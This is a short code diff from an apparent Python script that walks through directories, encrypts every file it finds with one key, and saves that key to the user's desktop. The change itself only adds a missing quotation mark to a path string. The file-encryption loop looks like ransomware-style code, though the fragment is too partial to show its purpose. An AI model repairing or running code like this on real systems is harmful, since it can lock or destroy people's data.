@@ -39,7 +39,7 @@ if __name__ == '__main__':
         for filename in filenames:
             file_path = os.path.join(dirpath, filename)
             encrypt_file(key, file_path)
-desktop = "C:\\Users\\username\\desktop
+desktop = "C:\\Users\\username\\desktop"
 key_file_path = os.path.join(desktop, 'key.txt')
 with open(key_file_path, 'wb') as key_file:
     key_file.write(key)
